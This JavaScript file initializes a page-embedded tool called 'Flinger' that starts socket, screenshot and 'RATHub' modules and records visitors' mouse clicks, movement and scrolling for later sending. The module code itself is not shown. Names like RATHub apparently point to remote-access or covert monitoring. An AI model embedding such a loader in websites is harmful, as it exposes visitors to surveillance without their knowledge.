var Flinger = (function () {
	var _flingerElement;
	var _debugFlinger;

	var constructor = function () {
		_flingerElement = document.querySelector('[data-flinger]');

		// Check if script is on debug mode
		_debugFlinger = _flingerElement.dataset.debug == undefined ? false : JSON.parse(_flingerElement.dataset.debug);
		if (_debugFlinger === true) {
			console.log('Flinger is on debug mode');
		}

		SocketHub.Initialize({ Debug: _debugFlinger });
		ScreenshotHub.Initialize({ Debug: _debugFlinger });
		RATHub.Initialize({ Debug: _debugFlinger });

		// Event Hub definition
		EventHub.Initialize({ Debug: _debugFlinger });
		EventHub.ListenMouseClick();
		EventHub.ListenMouseMovement();
		EventHub.ListenMouseScroll();
	}

	return {
		Initialize: constructor,
		GetNotSentMouseClickEvents: EventHub.GetNotSentMouseClickEvents,
		GetNotSentMouseMovementEvents: EventHub.GetNotSentMouseMovementEvents,
		GetNotSentMouseScrollEvents: EventHub.GetNotSentMouseScrollEvents
	};
})();

Flinger.Initialize();